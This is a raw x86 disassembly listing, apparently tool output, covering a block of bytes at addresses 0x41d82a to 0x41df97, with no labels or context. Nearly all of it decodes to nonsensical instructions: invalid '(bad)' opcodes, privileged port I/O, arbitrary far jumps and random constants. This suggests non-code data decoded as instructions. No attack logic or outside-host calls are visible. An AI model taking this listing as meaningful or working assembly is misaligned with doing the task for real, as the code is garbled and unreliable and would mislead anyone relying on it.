  41d82a:	(bad)  
  41d82b:	call   DWORD PTR [ecx]
  41d82d:	enter  0xe25d,0x12
  41d831:	stos   DWORD PTR es:[edi],eax
  41d832:	xchg   ah,al
  41d834:	cmp    ebx,DWORD PTR [edx-0x70]
  41d837:	lods   al,BYTE PTR ds:[esi]
  41d838:	loopne 0x41d868
  41d83a:	or     al,0xab
  41d83c:	dec    edx
  41d83d:	mov    ah,0xc4
  41d83f:	push   ss
  41d840:	jmp    0x41d86b
  41d842:	push   edx
  41d843:	pop    eax
  41d844:	sub    BYTE PTR [edx+0x5b],dh
  41d847:	jp     0x41d804
  41d849:	fwait
  41d84a:	fs mov eax,0x90d4cdd
  41d850:	sbb    ecx,DWORD PTR [esi]
  41d852:	mov    DWORD PTR [ebp-0x58],ecx
  41d855:	mov    ecx,DWORD PTR [ebp+0x8]
  41d858:	mov    edx,DWORD PTR [ebp-0x54]
  41d85b:	add    ecx,0x64f898
  41d861:	jmp    0x41fbc0
  41d866:	popf   
  41d867:	add    eax,0xa840804
  41d86c:	xchg   ecx,eax
  41d86d:	adc    bl,0x9b
  41d870:	pop    eax
  41d871:	in     al,dx
  41d872:	xchg   esi,eax
  41d873:	sbb    cl,BYTE PTR [edi-0x18]
  41d876:	scas   eax,DWORD PTR es:[edi]
  41d877:	fstp   TBYTE PTR [ebx+eax*4+0x3d]
  41d87b:	pop    esi
  41d87c:	add    DWORD PTR [ebx+0xd4601d8],0xffffffe2
  41d883:	repnz mov ds,WORD PTR [edi]
  41d886:	popf   
  41d887:	mov    ebp,0xaf814f86
  41d88c:	lock es ja 0x41d81c
  41d890:	xchg   esp,eax
  41d891:	arpl   WORD PTR [ebp-0x217e6b8a],si
  41d897:	or     eax,0x6c590b02
  41d89c:	lods   eax,DWORD PTR ds:[esi]
  41d89d:	(bad)  
  41d89f:	(bad)  
  41d8a0:	xchg   ebp,eax
  41d8a1:	fwait
  41d8a2:	lods   al,BYTE PTR ds:[esi]
  41d8a3:	xchg   ebp,eax
  41d8a4:	imul   eax,edx,0x25
  41d8a7:	retf   
  41d8a8:	inc    esi
  41d8a9:	scas   eax,DWORD PTR es:[edi]
  41d8aa:	(bad)  
  41d8ab:	fwait
  41d8ac:	mov    ds:0x68f33efc,eax
  41d8b1:	in     eax,dx
  41d8b2:	jmp    0x4e41:0xb6589a1
  41d8b9:	cld    
  41d8ba:	clc    
  41d8bb:	jge    0x41d908
  41d8bd:	sbb    ecx,ebp
  41d8bf:	hlt    
  41d8c0:	popa   
  41d8c1:	scas   eax,DWORD PTR es:[edi]
  41d8c2:	retf   0x2683
  41d8c5:	and    ah,BYTE PTR ds:0x3e4438d1
  41d8cb:	push   edx
  41d8cc:	stos   DWORD PTR es:[edi],eax
  41d8cd:	pop    edx
  41d8ce:	dec    edx
  41d8cf:	dec    ebx
  41d8d0:	xor    dl,BYTE PTR [ebx+0x7464f62b]
  41d8d6:	in     al,0xb0
  41d8d8:	pushf  
  41d8d9:	push   edi
  41d8da:	jp     0x41d8e3
  41d8dc:	mov    bh,0xfd
  41d8de:	add    cl,BYTE PTR [esi+0x3c38c8]
  41d8e4:	or     eax,0xe4d96924
  41d8e9:	(bad)  
  41d8ea:	fidivr DWORD PTR [ecx+0x5f775d88]
  41d8f0:	sbb    eax,0xaa5c45f5
  41d8f5:	mov    al,ds:0x48aa9ea7
  41d8fa:	mov    dl,0xea
  41d8fc:	fisub  WORD PTR [ecx-0x16a25ba5]
  41d902:	jmp    0x41d923
  41d904:	xchg   ebp,edi
  41d906:	ret    
  41d907:	push   0x39
  41d909:	push   0xd49c5fef
  41d90e:	loop   0x41d926
  41d910:	fidiv  WORD PTR [edi]
  41d912:	xchg   ebp,eax
  41d913:	push   edi
  41d914:	gs xchg edx,eax
  41d916:	mov    esp,0x9f39848
  41d91b:	sub    cl,BYTE PTR [ebx+0x16]
  41d91e:	sbb    BYTE PTR [ebx+0x51],al
  41d921:	dec    ebp
  41d922:	into   
  41d923:	mov    al,ds:0x9e5520a1
  41d928:	push   cs
  41d929:	call   0x66f5:0x2db2db38
  41d930:	test   eax,0x9e30cbf2
  41d935:	xchg   ebx,eax
  41d936:	repnz add DWORD PTR [eax],eax
  41d939:	jge    0x41d8c2
  41d93b:	mov    edi,0x535ea3fd
  41d940:	pop    eax
  41d941:	das    
  41d942:	cs add eax,0x39215049
  41d948:	jmp    0x648e45a1
  41d94d:	mov    edi,0x1e793aed
  41d952:	cmp    BYTE PTR [edx],dl
  41d954:	cmp    BYTE PTR [eax],cl
  41d956:	jge    0x41d8e2
  41d958:	bound  edx,QWORD PTR [edi-0x67]
  41d95b:	test   esi,esp
  41d95d:	sub    al,0xdf
  41d95f:	push   ss
  41d960:	push   es
  41d961:	loopne 0x41d9bc
  41d963:	or     eax,0x5b3b98f5
  41d968:	inc    ecx
  41d969:	lea    edi,[eax+0x2c4564dc]
  41d96f:	jo     0x41d95b
  41d971:	repnz imul edx,DWORD PTR [ecx],0xffffffb7
  41d975:	(bad)  
  41d976:	pusha  
  41d977:	frstor [ebx+0x5a0eaa64]
  41d97d:	sub    eax,0x99691931
  41d982:	add    dl,0x6d
  41d985:	adc    ch,0x94
  41d988:	mov    DWORD PTR [ecx],edx
  41d98a:	pop    ds
  41d98b:	pusha  
  41d98c:	cmp    esp,DWORD PTR [esi]
  41d98e:	enter  0xddf7,0xb8
  41d992:	push   edx
  41d993:	sub    al,0x40
  41d995:	xor    ah,BYTE PTR [ebp-0x54]
  41d998:	in     al,dx
  41d999:	mov    edi,0x7109b79e
  41d99e:	cmp    DWORD PTR [ecx],ebp
  41d9a0:	cmp    al,0x42
  41d9a2:	mov    ch,0xa6
  41d9a4:	pop    ss
  41d9a5:	rcr    ch,1
  41d9a7:	ficom  DWORD PTR [edx-0x49]
  41d9aa:	fistp  QWORD PTR [edi]
  41d9ac:	mov    dl,0xa9
  41d9ae:	pop    ebx
  41d9af:	dec    ecx
  41d9b0:	sar    bl,cl
  41d9b2:	xor    bl,BYTE PTR [eax-0x4a]
  41d9b5:	fnstcw WORD PTR [eax+0x54e0b784]
  41d9bb:	pushf  
  41d9bc:	adc    DWORD PTR [ebx+0x40],esp
  41d9bf:	rol    BYTE PTR [edx+0x23],0x2f
  41d9c3:	xchg   esi,eax
  41d9c4:	aam    0xfd
  41d9c6:	arpl   WORD PTR [ebp+0x6e],ax
  41d9c9:	pop    eax
  41d9ca:	call   0x18896eb6
  41d9cf:	mov    ds:0x227334b0,eax
  41d9d4:	popa   
  41d9d5:	pop    ebx
  41d9d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9d7:	adc    eax,0x2ca7795c
  41d9dc:	bound  edx,QWORD PTR [ecx+0x2c8480fd]
  41d9e2:	sub    al,dh
  41d9e4:	or     al,0xfa
  41d9e6:	push   cs
  41d9e7:	push   eax
  41d9e8:	jb     0x41d996
  41d9ea:	cmp    eax,DWORD PTR ds:0x18398a95
  41d9f0:	lods   eax,DWORD PTR ds:[esi]
  41d9f1:	(bad)  
  41d9f2:	fwait
  41d9f3:	mov    cl,ah
  41d9f5:	js     0x41d984
  41d9f7:	xor    esp,0x49
  41d9fa:	add    edi,DWORD PTR [ecx]
  41d9fc:	mov    esp,0xc8d3be1f
  41da01:	hlt    
  41da02:	xor    BYTE PTR [eax+eax*2],dh
  41da05:	loop   0x41da33
  41da07:	push   ebp
  41da08:	sub    cl,BYTE PTR [esi+eax*1]
  41da0b:	xor    DWORD PTR [ebp-0x11dd36ff],edx
  41da11:	pushf  
  41da12:	mov    dh,0x2b
  41da14:	jmp    0x8d38:0x7e19a3c0
  41da1b:	idiv   DWORD PTR [edx+eiz*4-0x4c7f887c]
  41da22:	mul    DWORD PTR [esi]
  41da24:	jbe    0x41da83
  41da26:	push   edi
  41da27:	cwde   
  41da28:	pop    ds
  41da29:	inc    edx
  41da2a:	fs jb  0x41daa3
  41da2d:	mov    dl,BYTE PTR [eax]
  41da2f:	push   eax
  41da30:	mov    al,0xa7
  41da32:	mov    esp,0x20ce0a28
  41da37:	and    DWORD PTR [ecx+0x19ab1538],0x23f76f5e
  41da41:	ror    DWORD PTR [esi+0x1dbd36f],1
  41da47:	dec    ecx
  41da48:	push   ds
  41da49:	pop    edx
  41da4a:	es ss mov ebx,0x7e569e77
  41da51:	mov    edx,0xae6f790
  41da56:	add    edi,DWORD PTR [edx-0xd]
  41da59:	and    BYTE PTR es:[ebx+eax*2+0x3b238fad],dl
  41da61:	sbb    al,0x66
  41da63:	jne    0x41da95
  41da65:	cmp    ch,al
  41da67:	sub    eax,DWORD PTR [esi]
  41da69:	(bad)  
  41da6a:	adc    BYTE PTR [ebx-0x2e71f866],cl
  41da70:	push   eax
  41da71:	sub    al,0xc8
  41da73:	mov    al,0xa1
  41da75:	push   eax
  41da76:	xchg   BYTE PTR [ebp+0x3f],bh
  41da79:	ror    dl,1
  41da7b:	sub    bh,BYTE PTR [esi+0x16143ab1]
  41da81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da82:	xor    al,0x16
  41da84:	bound  esp,QWORD PTR [esi+0x20fe2d45]
  41da8a:	rcl    ah,cl
  41da8c:	and    bh,bl
  41da8e:	outs   dx,BYTE PTR ds:[esi]
  41da8f:	dec    esp
  41da90:	dec    edx
  41da91:	xor    eax,0x2d6c3542
  41da96:	sub    DWORD PTR [ecx-0x56],esi
  41da99:	push   ecx
  41da9a:	lock cmp BYTE PTR [ebx],bh
  41da9d:	(bad)  
  41da9f:	and    BYTE PTR [eax+0x1],bl
  41daa2:	adc    dl,BYTE PTR [edx]
  41daa4:	sub    al,BYTE PTR [esi-0x720f808e]
  41daaa:	test   DWORD PTR [ebx+0x45],ebp
  41daad:	push   0xbfb4bd2b
  41dab2:	push   es
  41dab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dab4:	pushf  
  41dab5:	cmp    bh,BYTE PTR [edx+0x10f6221]
  41dabb:	adc    eax,0x5a42194b
  41dac0:	or     DWORD PTR [ebx],eax
  41dac2:	enter  0x7e7a,0xf5
  41dac6:	fistp  QWORD PTR [edx-0x49]
  41dac9:	jl     0x41dafc
  41dacb:	mov    ecx,cs
  41dacd:	inc    ebx
  41dace:	push   edx
  41dacf:	sub    BYTE PTR [esi+0xa5cd4e8],bl
  41dad5:	icebp  
  41dad6:	fwait
  41dad7:	push   eax
  41dad8:	pushf  
  41dad9:	adc    bh,BYTE PTR [eax]
  41dadb:	shl    DWORD PTR [edx+0x4bf36b18],1
  41dae1:	and    dl,cl
  41dae3:	sbb    eax,0x1154fff5
  41dae8:	cmp    BYTE PTR [esi+0x36e38c46],0xdd
  41daef:	cmp    al,0x24
  41daf1:	out    0x2c,eax
  41daf3:	sub    bl,BYTE PTR [esi]
  41daf5:	inc    edi
  41daf6:	jo     0x41db76
  41daf8:	sub    dh,BYTE PTR [edi+0x72]
  41dafb:	out    dx,al
  41dafc:	mov    eax,0xb632d353
  41db01:	or     al,0xcb
  41db03:	sub    BYTE PTR [esi+0x77],ch
  41db06:	scas   al,BYTE PTR es:[edi]
  41db07:	inc    edx
  41db08:	addr16 pop esi
  41db0a:	dec    ebx
  41db0b:	and    DWORD PTR [esi+edx*8],ebx
  41db0e:	dec    eax
  41db0f:	cmp    DWORD PTR [ecx+0x2d69a65f],esp
  41db15:	mov    ah,0xb7
  41db17:	jb     0x41db0a
  41db19:	shl    dh,1
  41db1b:	fcmovne st,st(3)
  41db1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db1e:	jo     0x41db13
  41db20:	ja     0x41dafe
  41db22:	sub    cl,BYTE PTR [edi+0x5c8e3008]
  41db28:	stc    
  41db29:	and    al,bl
  41db2b:	push   0x6ff4866b
  41db30:	inc    edi
  41db31:	sbb    ah,dl
  41db33:	inc    edx
  41db34:	out    dx,eax
  41db35:	psadbw mm2,mm2
  41db38:	or     al,0xa5
  41db3a:	sub    eax,DWORD PTR [esi+0x3c]
  41db3d:	mov    dh,0x78
  41db3f:	dec    edi
  41db40:	pop    esi
  41db41:	adc    eax,0x3a6b12fb
  41db46:	fcmovne st,st(5)
  41db48:	lods   al,BYTE PTR ds:[esi]
  41db49:	fistp  DWORD PTR [esi]
  41db4b:	push   ss
  41db4c:	xchg   DWORD PTR [esi-0x749a0bea],edx
  41db52:	add    al,0x0
  41db54:	xor    BYTE PTR [eax-0x2f],dl
  41db57:	dec    edi
  41db58:	add    DWORD PTR [esi+0x35],eax
  41db5b:	push   cs
  41db5c:	sub    edi,ecx
  41db5e:	dec    edx
  41db5f:	mov    eax,0xced388cc
  41db64:	sub    dl,bl
  41db66:	and    DWORD PTR [ecx],ebx
  41db68:	ins    DWORD PTR es:[edi],dx
  41db69:	sbb    DWORD PTR [eax-0x424e990e],esp
  41db6f:	push   ecx
  41db70:	out    0x98,eax
  41db72:	cs leave 
  41db74:	mov    edx,esi
  41db76:	push   es
  41db77:	adc    al,BYTE PTR ds:0x94694cf7
  41db7d:	fdivr  DWORD PTR ds:0xf034cf10
  41db83:	pop    eax
  41db84:	repz lock es sahf 
  41db88:	popf   
  41db89:	mov    cl,BYTE PTR [edx+0x46]
  41db8c:	jnp    0x41db9e
  41db8e:	popa   
  41db8f:	xchg   ebp,eax
  41db90:	aaa    
  41db91:	rcr    DWORD PTR [ebp+0x4a93becd],cl
  41db97:	bt     DWORD PTR [esi+eax*4+0x751a0061],edi
  41db9f:	mov    edi,0xaa259b96
  41dba4:	pop    es
  41dba5:	pop    ds
  41dba6:	mov    cl,0xed
  41dba8:	xor    dh,BYTE PTR [ebx-0x6bb5cd64]
  41dbae:	inc    edi
  41dbaf:	cmp    al,0x7a
  41dbb1:	or     eax,0xb7bf434f
  41dbb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbb7:	pop    eax
  41dbb8:	fwait
  41dbb9:	adc    BYTE PTR [esi+ebx*1+0x6b],ah
  41dbbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbbe:	mov    ds:0x963c19cb,eax
  41dbc3:	aaa    
  41dbc4:	inc    edi
  41dbc5:	fmul   DWORD PTR [ecx-0x39]
  41dbc8:	in     eax,dx
  41dbc9:	inc    ebx
  41dbca:	mov    edi,0x43793467
  41dbcf:	jb     0x41dbd9
  41dbd1:	es add BYTE PTR cs:[edi],dh
  41dbd5:	jmp    0x41db66
  41dbd7:	mov    esp,0xf66b9ba
  41dbdc:	mov    WORD PTR [edi],?
  41dbde:	mov    dh,0x86
  41dbe0:	and    BYTE PTR [ebp-0x4b],ch
  41dbe3:	xchg   edx,eax
  41dbe4:	cmp    ebp,DWORD PTR [ecx+0x39]
  41dbe7:	cmp    edx,esp
  41dbe9:	adc    al,0x2
  41dbeb:	jnp    0x41db6d
  41dbed:	adc    ch,BYTE PTR [ebx]
  41dbef:	shl    DWORD PTR [ecx-0x69a1002d],0x62
  41dbf6:	call   0xafecd7be
  41dbfb:	sbb    BYTE PTR [ecx],bl
  41dbfd:	je     0x41dc4c
  41dbff:	adc    ebp,DWORD PTR [esi]
  41dc01:	inc    eax
  41dc02:	mov    ss,WORD PTR [esi-0x2a5a8688]
  41dc08:	add    al,0x56
  41dc0a:	sbb    BYTE PTR [eax],dl
  41dc0c:	sar    DWORD PTR [eax-0x283e999c],cl
  41dc12:	pop    es
  41dc13:	mov    dh,0xa5
  41dc15:	popa   
  41dc16:	lods   eax,DWORD PTR ds:[esi]
  41dc17:	retf   0x1c1d
  41dc1a:	stos   DWORD PTR es:[edi],eax
  41dc1b:	mov    ebx,0xc7370b11
  41dc20:	xchg   ebp,eax
  41dc21:	shl    BYTE PTR [ebp-0x6c19f8ee],0xc8
  41dc28:	dec    esp
  41dc29:	sub    DWORD PTR [esi+0x23],edi
  41dc2c:	cli    
  41dc2d:	fwait
  41dc2e:	mov    DWORD PTR [ebp-0x2],esp
  41dc31:	arpl   WORD PTR [edi-0x51],di
  41dc34:	push   es
  41dc35:	sub    eax,0x711644be
  41dc3a:	xor    BYTE PTR [ecx-0x36],cl
  41dc3d:	dec    edx
  41dc3e:	hlt    
  41dc3f:	jno    0x41dbe2
  41dc41:	jb     0x41dbd9
  41dc43:	sahf   
  41dc44:	push   esi
  41dc45:	pop    es
  41dc46:	pop    es
  41dc47:	sub    bl,BYTE PTR [ecx+0x6ed42555]
  41dc4d:	mov    esi,0xb5016284
  41dc52:	and    al,0x4
  41dc54:	jge    0x41dc9c
  41dc56:	jbe    0x41dbed
  41dc58:	add    BYTE PTR [eax+0x30],dl
  41dc5b:	ja     0x41dbf4
  41dc5d:	je     0x41dc62
  41dc5f:	outs   dx,DWORD PTR ds:[esi]
  41dc60:	hlt    
  41dc61:	jne    0x41dc0d
  41dc63:	scas   al,BYTE PTR es:[edi]
  41dc64:	sbb    dh,BYTE PTR [eax-0xc]
  41dc67:	inc    ebx
  41dc68:	out    0x3e,eax
  41dc6a:	jecxz  0x41dc71
  41dc6c:	enter  0x7eaf,0xf4
  41dc70:	call   0xbdb5b1c3
  41dc75:	inc    ecx
  41dc76:	jno    0x41dcdd
  41dc78:	push   0x78
  41dc7a:	ss pusha 
  41dc7c:	inc    ebp
  41dc7d:	leave  
  41dc7e:	push   edx
  41dc7f:	test   al,0x60
  41dc81:	cmp    al,0xe8
  41dc83:	jno    0x41dc7c
  41dc85:	sub    ebx,edi
  41dc87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc88:	mov    eax,ds:0xdae2f557
  41dc8d:	ror    DWORD PTR [ebp-0x42],0xdc
  41dc91:	jmp    0xa519:0x3649ae84
  41dc98:	mov    cs,WORD PTR [eax+0x12]
  41dc9b:	mov    al,ds:0x3484603
  41dca0:	stos   BYTE PTR es:[edi],al
  41dca1:	test   DWORD PTR [esi+0x3b],eax
  41dca4:	mov    al,0x93
  41dca6:	mov    al,0x4c
  41dca8:	retf   0xbc05
  41dcab:	mov    ebp,0xb6aacb2b
  41dcb0:	sahf   
  41dcb1:	scas   al,BYTE PTR es:[edi]
  41dcb2:	and    DWORD PTR [ebx+0x23f38603],ebx
  41dcb8:	and    esp,DWORD PTR [ebx]
  41dcba:	jmp    0x41dc92
  41dcbc:	cs jmp 0x41dc9e
  41dcbf:	into   
  41dcc0:	cdq    
  41dcc1:	add    al,0xc5
  41dcc3:	cs aad 0xd3
  41dcc6:	bswap  esi
  41dcc8:	sti    
  41dcc9:	jno    0x41dcca
  41dccb:	and    eax,esp
  41dccd:	cmp    bl,bl
  41dccf:	add    eax,0x35f50d44
  41dcd4:	(bad)
  41dcd8:	mov    ecx,0x77cd724d
  41dcdd:	and    BYTE PTR ds:0x3f72d629,0xd6
  41dce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dce5:	sbb    eax,0x3a0392cc
  41dcea:	scas   al,BYTE PTR es:[edi]
  41dceb:	adc    al,0xaa
  41dced:	cmp    BYTE PTR [edx+0x1d],bl
  41dcf0:	jge    0x41dc7b
  41dcf2:	jg     0x41dcb8
  41dcf4:	sub    ebx,esi
  41dcf6:	out    0xad,al
  41dcf8:	inc    ebp
  41dcf9:	and    dl,BYTE PTR [edx]
  41dcfb:	cmp    BYTE PTR [edi],al
  41dcfd:	rol    DWORD PTR [ecx-0xd],1
  41dd00:	mov    edi,0xca35f422
  41dd05:	(bad)  
  41dd07:	mov    edx,0x2fee1596
  41dd0c:	scas   eax,DWORD PTR es:[edi]
  41dd0d:	loop   0x41dd56
  41dd0f:	outs   dx,DWORD PTR ds:[esi]
  41dd10:	jmp    0x8ac843e0
  41dd15:	arpl   WORD PTR [ebx],bp
  41dd17:	into   
  41dd18:	dec    esp
  41dd19:	mov    DWORD PTR [esi],esp
  41dd1b:	xlat   BYTE PTR ds:[ebx]
  41dd1c:	les    esp,FWORD PTR [edi+0x5d1cd7be]
  41dd22:	inc    ebp
  41dd23:	pop    esi
  41dd24:	scas   eax,DWORD PTR es:[edi]
  41dd25:	outs   dx,BYTE PTR ds:[esi]
  41dd26:	cdq    
  41dd27:	xchg   esi,eax
  41dd28:	mov    ecx,0x1d2c6578
  41dd2d:	stos   BYTE PTR es:[edi],al
  41dd2e:	(bad)  
  41dd30:	lds    edi,FWORD PTR [esi+0x3e]
  41dd33:	push   esi
  41dd34:	aad    0xb7
  41dd36:	jge    0x41dcbc
  41dd38:	inc    edx
  41dd39:	sbb    al,0xd4
  41dd3b:	test   DWORD PTR [ebx],edi
  41dd3d:	jae    0x41dcd5
  41dd3f:	sbb    DWORD PTR [edi+0x3c8274f7],0x6d2aa430
  41dd49:	cmp    BYTE PTR [edx],ah
  41dd4b:	(bad)
  41dd4f:	out    dx,al
  41dd50:	jo     0x41ddce
  41dd52:	pop    ecx
  41dd53:	add    DWORD PTR [ebp+0x6c],ebp
  41dd56:	fidivr DWORD PTR [eax+0x1ab6d88e]
  41dd5c:	mov    DWORD PTR [edi],edi
  41dd5e:	test   al,0x80
  41dd60:	das    
  41dd61:	xchg   edx,eax
  41dd62:	imul   DWORD PTR [ebx-0x67b1e0fd]
  41dd68:	mov    ecx,0x679f399a
  41dd6d:	xor    ecx,DWORD PTR [edx+0x311cc51d]
  41dd73:	stos   DWORD PTR es:[edi],eax
  41dd74:	aad    0x26
  41dd76:	cmc    
  41dd77:	enter  0xae89,0x68
  41dd7b:	mov    dh,0x19
  41dd7d:	mov    ds:0x14b990fc,eax
  41dd82:	out    dx,al
  41dd83:	daa    
  41dd84:	pop    ds
  41dd85:	xlat   BYTE PTR ds:[ebx]
  41dd86:	xchg   ebx,eax
  41dd87:	add    BYTE PTR [ecx-0x67533b47],ah
  41dd8d:	xchg   ecx,eax
  41dd8e:	cmp    edx,DWORD PTR [edx]
  41dd90:	test   BYTE PTR [eax-0x639787e6],0xfa
  41dd97:	pop    ss
  41dd98:	jno    0x41dd22
  41dd9a:	cmp    al,0x4e
  41dd9c:	sbb    al,0x95
  41dd9e:	mov    BYTE PTR [edi],bl
  41dda0:	sbb    eax,0x61746dc3
  41dda6:	push   es
  41dda7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dda8:	stos   DWORD PTR es:[edi],eax
  41dda9:	loope  0x41dd7c
  41ddab:	(bad)  
  41ddac:	aam    0xe8
  41ddae:	lods   eax,DWORD PTR ds:[esi]
  41ddaf:	scas   al,BYTE PTR es:[edi]
  41ddb0:	aam    0x91
  41ddb2:	xchg   ebx,eax
  41ddb3:	xor    cl,bl
  41ddb5:	fidivr DWORD PTR [edx+0x4c]
  41ddb8:	scas   al,BYTE PTR es:[edi]
  41ddb9:	ror    DWORD PTR [edx+0x57604c4c],cl
  41ddbf:	rol    esp,cl
  41ddc1:	adc    eax,0x4ac6b1f5
  41ddc6:	xor    eax,0xb0c25190
  41ddcb:	shl    DWORD PTR [ebx],0x2
  41ddce:	into   
  41ddcf:	enter  0xf567,0x50
  41ddd3:	aad    0x69
  41ddd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddd6:	xchg   BYTE PTR [ebp+0x4864f8b5],dh
  41dddc:	mov    WORD PTR [eax],es
  41ddde:	dec    edi
  41dddf:	and    al,0x82
  41dde1:	loop   0x41de24
  41dde3:	cmp    al,0xf5
  41dde5:	adc    DWORD PTR [ebp+0x8],ebx
  41dde8:	add    al,0xb4
  41ddea:	push   ss
  41ddeb:	in     al,0xc7
  41dded:	sub    al,0xf8
  41ddef:	leave  
  41ddf0:	cmp    esp,edx
  41ddf2:	cmp    ah,ch
  41ddf4:	fcom   DWORD PTR [edx+eiz*1-0x30]
  41ddf8:	or     dh,ah
  41ddfa:	mov    es,edi
  41ddfc:	xor    al,0xd8
  41ddfe:	and    eax,0x3c14f5ba
  41de03:	push   ebx
  41de04:	fadd   DWORD PTR [ebx+0x60]
  41de07:	leave  
  41de08:	pmuludq mm4,mm7
  41de0b:	jno    0x41de1b
  41de0d:	(bad)  
  41de0e:	ins    DWORD PTR es:[edi],dx
  41de0f:	mov    ah,0xe7
  41de11:	xchg   esi,eax
  41de12:	or     al,0xa
  41de14:	sbb    ebx,DWORD PTR [ebx-0x20]
  41de17:	out    dx,al
  41de18:	inc    BYTE PTR [ebx+0x2b8abea3]
  41de1e:	mov    bl,0x4a
  41de20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de21:	sub    DWORD PTR [esi-0x2bf4fa78],edx
  41de27:	add    al,0x79
  41de29:	ins    DWORD PTR es:[edi],dx
  41de2a:	dec    ecx
  41de2b:	leave  
  41de2c:	call   0x4b89:0xc343c87b
  41de33:	mov    edi,0x2e3203fe
  41de38:	(bad)  
  41de39:	cmp    ch,BYTE PTR [ebp+eax*2+0x4c2fe5f3]
  41de40:	mul    BYTE PTR [esi-0x301df8c]
  41de46:	push   ebx
  41de47:	sub    bl,0xef
  41de4a:	sub    DWORD PTR [ebx+0x6b9c9ed6],0xfffffff0
  41de51:	and    eax,0xd99da52a
  41de56:	and    eax,0xa387569a
  41de5b:	adc    al,0x82
  41de5d:	scas   eax,DWORD PTR es:[edi]
  41de5e:	add    DWORD PTR [ebp-0x7166010d],ebp
  41de64:	outs   dx,DWORD PTR ds:[esi]
  41de65:	retf   
  41de66:	mov    dl,0xc5
  41de69:	pop    ebx
  41de6a:	data16 mov dl,0xcc
  41de6d:	mov    edx,0xabb12700
  41de72:	pop    ecx
  41de73:	test   eax,0xe8a4d841
  41de78:	sub    ecx,DWORD PTR [ebx]
  41de7a:	(bad)  
  41de7b:	jge    0x41debd
  41de7d:	setbe  BYTE PTR [ebx+0x482b49b2]
  41de84:	lea    edx,[edx+esi*1+0x5b]
  41de88:	jns    0x41deb3
  41de8a:	push   ecx
  41de8b:	mov    ds:0xd65dbc5a,al
  41de90:	clc    
  41de91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de92:	and    al,0xa8
  41de94:	push   edi
  41de95:	shl    ah,1
  41de97:	push   eax
  41de98:	mov    ecx,DWORD PTR [ebx]
  41de9a:	cmp    DWORD PTR [eax+0x5ecff9ce],0x9e1cba60
  41dea4:	imul   DWORD PTR [ecx-0x363e1600]
  41deaa:	or     DWORD PTR [ebp+0x24],ebx
  41dead:	daa    
  41deae:	das    
  41deaf:	cmp    BYTE PTR [ebx],0x3b
  41deb2:	sub    bh,0x63
  41deb5:	cld    
  41deb6:	sub    ecx,0xa
  41deb9:	cld    
  41deba:	sbb    al,0x1d
  41debc:	pop    ss
  41debd:	arpl   bx,sp
  41debf:	pminsw mm1,QWORD PTR [ecx+0x3e]
  41dec3:	cmp    BYTE PTR [ebx],ah
  41dec5:	ret    
  41dec6:	push   ss
  41dec7:	jp     0x41dea3
  41dec9:	mov    ecx,DWORD PTR [edi-0x1ae3200c]
  41decf:	xchg   esp,eax
  41ded0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ded1:	dec    ebp
  41ded2:	lods   eax,DWORD PTR ds:[esi]
  41ded3:	mov    ds:0xd3361524,eax
  41ded8:	pop    ebx
  41ded9:	mov    cl,0x5a
  41dedb:	aam    0xd
  41dedd:	xlat   BYTE PTR ds:[ebx]
  41dede:	push   ebx
  41dedf:	ins    DWORD PTR es:[edi],dx
  41dee0:	or     BYTE PTR [ecx+0x2a],bh
  41dee3:	xchg   esi,eax
  41dee4:	pop    esp
  41dee5:	inc    DWORD PTR [edi]
  41dee7:	sub    al,0x60
  41dee9:	sub    cl,ah
  41deeb:	gs imul ebp,ebp,0xab376741
  41def2:	data16 mov bh,0x5c
  41def5:	mov    al,ds:0xb0a538db
  41defa:	xlat   BYTE PTR ds:[ebx]
  41defb:	int3   
  41defc:	rcr    BYTE PTR [esi-0x79],1
  41deff:	jmp    0x248f5029
  41df04:	jb     0x41ded2
  41df06:	shl    DWORD PTR [edi-0x76],cl
  41df09:	in     eax,0xf3
  41df0b:	push   cs
  41df0c:	loopne 0x41df49
  41df0e:	pushf  
  41df0f:	dec    ebx
  41df10:	push   ds
  41df11:	and    eax,0x283aff0c
  41df16:	dec    ebx
  41df17:	into   
  41df18:	(bad)  
  41df19:	push   eax
  41df1a:	mov    esi,0x7ca90b29
  41df1f:	mov    ds:0xcf6e425a,eax
  41df24:	sbb    ch,0x26
  41df27:	mov    ds:0xbd01b2f4,eax
  41df2c:	enter  0xc472,0xd3
  41df30:	or     al,0x91
  41df32:	or     al,BYTE PTR [ebx+edi*1]
  41df35:	or     DWORD PTR [edi+edx*4+0x15574ed2],edi
  41df3c:	std    
  41df3d:	loop   0x41df7e
  41df3f:	lods   eax,DWORD PTR ds:[esi]
  41df40:	call   0x3c79:0x674e550f
  41df47:	test   eax,0xd77e4c59
  41df4c:	xchg   ebx,eax
  41df4d:	imul   cl
  41df4f:	add    ch,BYTE PTR ds:0x7d63f381
  41df55:	cli    
  41df56:	mov    ah,0xe0
  41df58:	repnz xor al,BYTE PTR [ebp+0x757401d8]
  41df5f:	int3   
  41df60:	jns    0x41df76
  41df62:	fcmovne st,st(7)
  41df64:	icebp  
  41df65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df66:	adc    edi,DWORD PTR [edi-0x6c]
  41df69:	sbb    DWORD PTR [ecx],edx
  41df6b:	call   0x1324:0x157a5bdf
  41df72:	or     bh,BYTE PTR [esi]
  41df74:	xchg   ebx,eax
  41df75:	int3   
  41df76:	ficom  WORD PTR [ebx+0x4c]
  41df79:	test   BYTE PTR [esi-0x48],0x4e
  41df7d:	call   0x422cd713
  41df82:	pop    edx
  41df83:	xor    DWORD PTR [ebx+0x39],esp
  41df86:	fnsave [ebx-0x71276ce3]
  41df8c:	or     eax,0x11599dc2
  41df91:	inc    esi
  41df92:	(bad)  
  41df93:	cdq    
  41df94:	jb     0x41df8d
  41df96:	daa    
  41df97:	sub    BYTE PTR [edx+0x5d25881b],cl
